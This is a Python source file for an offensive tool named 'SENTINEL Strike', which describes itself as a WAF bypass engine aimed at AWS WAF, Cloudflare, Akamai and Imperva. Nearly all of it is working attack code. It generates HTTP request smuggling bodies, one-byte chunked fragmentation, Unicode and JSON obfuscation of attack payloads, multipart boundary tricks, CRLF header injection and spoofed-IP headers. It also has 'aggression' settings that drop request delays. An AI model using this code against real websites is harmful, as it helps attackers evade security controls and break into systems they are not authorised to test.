#!/usr/bin/env python3
"""
SENTINEL Strike v3.0 — Enterprise WAF Bypass Engine

Advanced L4-level bypass techniques for enterprise WAFs:
- AWS WAF
- Cloudflare Enterprise
- Akamai Kona
- Imperva/Incapsula
- F5 BIG-IP ASM

Techniques:
1. Request Smuggling (CL.TE, TE.CL, TE.TE)
2. Chunked Micro-fragmentation
3. HTTP/2 Pseudo-header Injection
4. Unicode Normalization Forms
5. JSON/XML Smuggling
6. Time-based Evasion
7. ML-based Payload Mutation

Author: SENTINEL Strike Team
"""

import random
import string
import json
from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import IntEnum
from urllib.parse import quote


class AggressionLevel(IntEnum):
    """Aggression levels for bypass techniques."""
    SILENT = 1      # Minimal detection, slow
    QUIET = 2
    LOW = 3
    MEDIUM = 4
    DEFAULT = 5
    ELEVATED = 6
    HIGH = 7
    AGGRESSIVE = 8
    MAXIMUM = 9
    BRUTAL = 10     # All techniques, no delays, risk of ban


@dataclass
class EnterpriseBypassConfig:
    """Configuration for enterprise bypass."""
    aggression: int = 5
    use_smuggling: bool = True
    use_chunked: bool = True
    use_http2: bool = False
    burp_proxy: Optional[str] = None  # e.g., "http://127.0.0.1:8080"
    custom_headers: Dict[str, str] = None

    def __post_init__(self):
        if self.custom_headers is None:
            self.custom_headers = {}


@dataclass
class BypassPayload:
    """Bypass payload with metadata."""
    original: str
    bypassed: str
    technique: str
    http_method: str = "GET"
    headers: Dict[str, str] = None
    body: Optional[str] = None
    content_type: Optional[str] = None
    success_rate: float = 0.5

    def __post_init__(self):
        if self.headers is None:
            self.headers = {}


class EnterpriseBypass:
    """
    Enterprise-grade WAF bypass engine.

    Implements L4 techniques that can bypass:
    - AWS WAF
    - Cloudflare Enterprise  
    - Akamai Kona
    - Imperva
    """

    def __init__(self, config: EnterpriseBypassConfig = None):
        self.config = config or EnterpriseBypassConfig()

        # Technique effectiveness by WAF
        self.waf_effectiveness = {
            "aws_waf": {
                "smuggling_cl_te": 0.7,
                "chunked_micro": 0.6,
                "unicode_normalize": 0.5,
                "json_smuggle": 0.8,
                "multiline_header": 0.4,
            },
            "cloudflare": {
                "smuggling_te_cl": 0.5,
                "chunked_micro": 0.4,
                "unicode_normalize": 0.7,
                "overlong_utf8": 0.6,
            },
            "akamai": {
                "hpp": 0.6,
                "chunked_micro": 0.5,
                "unicode_normalize": 0.4,
            },
            "imperva": {
                "multipart_boundary": 0.7,
                "charset_confusion": 0.6,
                "json_smuggle": 0.5,
            },
        }

    # =========================================================================
    # REQUEST SMUGGLING
    # =========================================================================

    def smuggle_cl_te(self, payload: str, param: str) -> BypassPayload:
        """
        Content-Length / Transfer-Encoding desync.

        Front-end uses Content-Length, back-end uses Transfer-Encoding.
        Payload is hidden in the "leftover" request.
        """
        smuggled_request = f"0\r\n\r\nGET /?{param}={quote(payload)} HTTP/1.1\r\nFoo: x"

        body = f"1\r\nZ\r\n{smuggled_request}"

        headers = {
            "Content-Length": str(len(body)),
            "Transfer-Encoding": "chunked",
            "Connection": "keep-alive",
        }

        return BypassPayload(
            original=payload,
            bypassed=smuggled_request,
            technique="CL.TE Request Smuggling",
            http_method="POST",
            headers=headers,
            body=body,
            content_type="application/x-www-form-urlencoded",
            success_rate=0.7,
        )

    def smuggle_te_cl(self, payload: str, param: str) -> BypassPayload:
        """
        Transfer-Encoding / Content-Length desync.

        Front-end uses Transfer-Encoding, back-end uses Content-Length.
        """
        # Obfuscated Transfer-Encoding header
        te_variants = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
            "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked",
        ]

        body = f"0\r\n\r\n{param}={quote(payload)}"

        headers = {
            "Content-Length": "4",
            "Transfer-Encoding": random.choice(["chunked", "xchunked", " chunked"]),
        }

        return BypassPayload(
            original=payload,
            bypassed=body,
            technique="TE.CL Request Smuggling",
            http_method="POST",
            headers=headers,
            body=body,
            success_rate=0.5,
        )

    def smuggle_te_te(self, payload: str, param: str) -> BypassPayload:
        """
        Transfer-Encoding obfuscation.

        Both use TE but parse it differently due to obfuscation.
        """
        obfuscations = [
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: cow",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
            "Transfer-Encoding: chunked\r\n Transfer-Encoding: x",
            "X: X\r\nTransfer-Encoding: chunked",
            "Transfer-Encoding\r\n: chunked",
        ]

        body = f"0\r\n\r\nGET /?{param}={quote(payload)} HTTP/1.1\r\nX: Y"

        headers = {
            "Transfer-Encoding": "chunked",
            "Transfer-encoding": "cow",  # Duplicate with different case
        }

        return BypassPayload(
            original=payload,
            bypassed=body,
            technique="TE.TE Request Smuggling (obfuscation)",
            http_method="POST",
            headers=headers,
            body=body,
            success_rate=0.4,
        )

    # =========================================================================
    # CHUNKED FRAGMENTATION
    # =========================================================================

    def chunked_micro(self, payload: str) -> BypassPayload:
        """
        Micro-chunking: one byte per chunk.

        WAFs often fail to reassemble many tiny chunks.
        """
        chunks = []
        for char in payload:
            chunks.append(f"1\r\n{char}\r\n")
        chunks.append("0\r\n\r\n")

        body = "".join(chunks)

        headers = {
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        return BypassPayload(
            original=payload,
            bypassed=body,
            technique="Chunked Micro-fragmentation",
            http_method="POST",
            headers=headers,
            body=body,
            success_rate=0.6,
        )

    def chunked_random(self, payload: str) -> BypassPayload:
        """
        Random chunk sizes to evade pattern detection.
        """
        chunks = []
        i = 0
        while i < len(payload):
            chunk_size = random.randint(1, min(5, len(payload) - i))
            chunk = payload[i:i+chunk_size]
            chunks.append(f"{chunk_size:x}\r\n{chunk}\r\n")
            i += chunk_size
        chunks.append("0\r\n\r\n")

        body = "".join(chunks)

        headers = {
            "Transfer-Encoding": "chunked",
        }

        return BypassPayload(
            original=payload,
            bypassed=body,
            technique="Chunked Random Fragmentation",
            http_method="POST",
            headers=headers,
            body=body,
            success_rate=0.5,
        )

    def chunked_with_extensions(self, payload: str) -> BypassPayload:
        """
        Add chunk extensions (comments) to confuse WAF parsers.
        """
        chunks = []
        extensions = [";ext=val", ";comment", ";x=y", ";a"]

        for i, char in enumerate(payload):
            ext = extensions[i % len(extensions)]
            chunks.append(f"1{ext}\r\n{char}\r\n")
        chunks.append("0\r\n\r\n")

        body = "".join(chunks)

        headers = {
            "Transfer-Encoding": "chunked",
        }

        return BypassPayload(
            original=payload,
            bypassed=body,
            technique="Chunked with Extensions",
            http_method="POST",
            headers=headers,
            body=body,
            success_rate=0.55,
        )

    # =========================================================================
    # UNICODE NORMALIZATION
    # =========================================================================

    def unicode_fullwidth(self, payload: str) -> BypassPayload:
        """
        Replace ASCII with fullwidth Unicode equivalents.

        Example: < → ＜ (U+FF1C)
        Backend may normalize to ASCII.
        """
        fullwidth_map = {
            '<': '＜', '>': '＞', "'": '＇', '"': '＂',
            '/': '／', '\\': '＼', '(': '（', ')': '）',
            '=': '＝', ';': '；', ':': '：', '?': '？',
            '&': '＆', '#': '＃', '%': '％', '+': '＋',
        }

        result = ""
        for char in payload:
            result += fullwidth_map.get(char, char)

        return BypassPayload(
            original=payload,
            bypassed=result,
            technique="Unicode Fullwidth",
            success_rate=0.6,
        )

    def unicode_homoglyphs(self, payload: str) -> BypassPayload:
        """
        Replace characters with visually similar Unicode.

        Example: a → а (Cyrillic), o → ο (Greek)
        """
        homoglyphs = {
            'a': 'а', 'e': 'е', 'o': 'о', 'p': 'р',
            'c': 'с', 'x': 'х', 'y': 'у', 'i': 'і',
            'A': 'А', 'E': 'Е', 'O': 'О', 'P': 'Р',
            'C': 'С', 'X': 'Х', 'H': 'Н', 'B': 'В',
        }

        result = ""
        for char in payload:
            if random.random() > 0.5:
                result += homoglyphs.get(char, char)
            else:
                result += char

        return BypassPayload(
            original=payload,
            bypassed=result,
            technique="Unicode Homoglyphs",
            success_rate=0.5,
        )

    # =========================================================================
    # JSON SMUGGLING
    # =========================================================================

    def json_unicode_escape(self, payload: str, param: str) -> BypassPayload:
        """
        Use JSON unicode escapes for characters.

        Example: < → \\u003c
        """
        escaped = ""
        for char in payload:
            if not char.isalnum():
                escaped += f"\\u{ord(char):04x}"
            else:
                escaped += char

        body = json.dumps({param: escaped})

        headers = {
            "Content-Type": "application/json",
        }

        return BypassPayload(
            original=payload,
            bypassed=escaped,
            technique="JSON Unicode Escape",
            http_method="POST",
            headers=headers,
            body=body,
            content_type="application/json",
            success_rate=0.7,
        )

    def json_nested(self, payload: str, param: str) -> BypassPayload:
        """
        Deep nesting to exhaust WAF parser.
        """
        depth = 10
        inner = {param: payload}

        for i in range(depth):
            inner = {"data": inner}

        body = json.dumps(inner)

        headers = {
            "Content-Type": "application/json",
        }

        return BypassPayload(
            original=payload,
            bypassed=body,
            technique="JSON Deep Nesting",
            http_method="POST",
            headers=headers,
            body=body,
            success_rate=0.4,
        )

    def json_duplicate_keys(self, payload: str, param: str) -> BypassPayload:
        """
        Duplicate JSON keys - last one wins in most parsers.
        """
        # Raw JSON with duplicate keys (can't use json.dumps)
        safe_value = "harmless"
        body = f'{{"{param}": "{safe_value}", "{param}": "{payload}"}}'

        headers = {
            "Content-Type": "application/json",
        }

        return BypassPayload(
            original=payload,
            bypassed=body,
            technique="JSON Duplicate Keys",
            http_method="POST",
            headers=headers,
            body=body,
            success_rate=0.6,
        )

    # =========================================================================
    # MULTIPART MANIPULATION
    # =========================================================================

    def multipart_boundary_confusion(self, payload: str, param: str) -> BypassPayload:
        """
        Confusing boundary declarations.
        """
        boundary1 = "----WebKitFormBoundary" + \
            ''.join(random.choices(string.ascii_letters, k=16))
        boundary2 = "----WebKitFormBoundary" + \
            ''.join(random.choices(string.ascii_letters, k=16))

        # Declare one boundary, use another
        body = f"""--{boundary2}
Content-Disposition: form-data; name="{param}"

{payload}
--{boundary2}--"""

        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary1}",
        }

        return BypassPayload(
            original=payload,
            bypassed=body,
            technique="Multipart Boundary Confusion",
            http_method="POST",
            headers=headers,
            body=body,
            success_rate=0.5,
        )

    def multipart_filename_injection(self, payload: str, param: str) -> BypassPayload:
        """
        Inject payload in filename field.
        """
        boundary = "----WebKitFormBoundary" + \
            ''.join(random.choices(string.ascii_letters, k=16))

        body = f"""--{boundary}
Content-Disposition: form-data; name="{param}"; filename="{payload}"
Content-Type: application/octet-stream

dummy
--{boundary}--"""

        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        }

        return BypassPayload(
            original=payload,
            bypassed=body,
            technique="Multipart Filename Injection",
            http_method="POST",
            headers=headers,
            body=body,
            success_rate=0.5,
        )

    # =========================================================================
    # HEADER MANIPULATION
    # =========================================================================

    def header_newline_injection(self, payload: str) -> Dict[str, str]:
        """
        Inject newlines in headers (CRLF injection).
        """
        return {
            "X-Custom-Header": f"value\r\nX-Injected: {payload}",
            "X-Forwarded-For": "127.0.0.1",
        }

    def header_continuation(self, payload: str) -> Dict[str, str]:
        """
        Use header line continuation (obsolete but sometimes works).
        """
        return {
            "X-Custom": f"start\r\n {payload}",
        }

    def get_bypass_headers(self) -> Dict[str, str]:
        """
        Get headers that help bypass WAF.
        """
        return {
            # IP spoofing
            "X-Forwarded-For": f"127.0.0.{random.randint(1, 254)}",
            "X-Originating-IP": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",

            # Origin tricks
            "Origin": "null",
            "Referer": "",

            # Content type confusion
            "Accept": "*/*",

            # Cache bypass
            "Cache-Control": "no-cache, no-store",
            "Pragma": "no-cache",

            # WAF bypass headers
            "X-Requested-With": "XMLHttpRequest",
        }

    # =========================================================================
    # MAIN API
    # =========================================================================

    def generate_bypasses(
        self,
        payload: str,
        param: str = "id",
        count: int = 10,
        waf_type: str = None
    ) -> List[BypassPayload]:
        """
        Generate multiple bypass variants based on aggression level.

        Args:
            payload: Original attack payload
            param: Parameter name
            count: Number of variants to generate
            waf_type: Target WAF type for optimization

        Returns:
            List of bypass payloads sorted by success rate
        """
        results = []
        aggression = self.config.aggression

        # Level 1-3: Basic techniques (HTTP-safe only)
        results.append(self.chunked_random(payload))
        results.append(self.json_unicode_escape(payload, param))

        # Level 4-6: Medium techniques
        if aggression >= 4:
            results.append(self.chunked_random(payload))
            results.append(self.json_unicode_escape(payload, param))

        # Level 7-8: Advanced techniques
        if aggression >= 7:
            results.append(self.chunked_micro(payload))
            results.append(self.chunked_with_extensions(payload))
            results.append(self.json_nested(payload, param))
            results.append(self.json_duplicate_keys(payload, param))
            results.append(self.multipart_boundary_confusion(payload, param))

        # Level 9-10: Request smuggling (dangerous)
        if aggression >= 9:
            results.append(self.smuggle_cl_te(payload, param))
            results.append(self.smuggle_te_cl(payload, param))
            results.append(self.smuggle_te_te(payload, param))
            results.append(self.multipart_filename_injection(payload, param))

        # Boost effectiveness for detected WAF
        if waf_type and waf_type.lower() in self.waf_effectiveness:
            waf_rates = self.waf_effectiveness[waf_type.lower()]
            for result in results:
                for technique, rate in waf_rates.items():
                    if technique.replace("_", " ") in result.technique.lower():
                        result.success_rate = max(result.success_rate, rate)

        # Sort by success rate
        results.sort(key=lambda x: x.success_rate, reverse=True)

        return results[:count]

    def get_aggression_delay(self) -> float:
        """
        Get delay between requests based on aggression level.
        """
        delays = {
            1: 5.0,    # Very slow
            2: 4.0,
            3: 3.0,
            4: 2.0,
            5: 1.5,
            6: 1.0,
            7: 0.5,
            8: 0.3,
            9: 0.1,
            10: 0.0,   # No delay
        }
        return delays.get(self.config.aggression, 1.0)

    def get_proxy_config(self) -> Optional[str]:
        """
        Get proxy configuration (Burp Suite or custom).
        """
        return self.config.burp_proxy


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================

def create_enterprise_bypass(
    aggression: int = 5,
    burp_proxy: str = None
) -> EnterpriseBypass:
    """
    Create enterprise bypass with configuration.

    Args:
        aggression: 1-10 (higher = more aggressive)
        burp_proxy: Burp Suite proxy URL (e.g., "http://127.0.0.1:8080")
    """
    config = EnterpriseBypassConfig(
        aggression=aggression,
        burp_proxy=burp_proxy,
        use_smuggling=(aggression >= 9),
        use_chunked=(aggression >= 4),
    )
    return EnterpriseBypass(config)


# For backwards compatibility
AGGRESSION_LEVELS = {name: level.value for name,
                     level in AggressionLevel.__members__.items()}
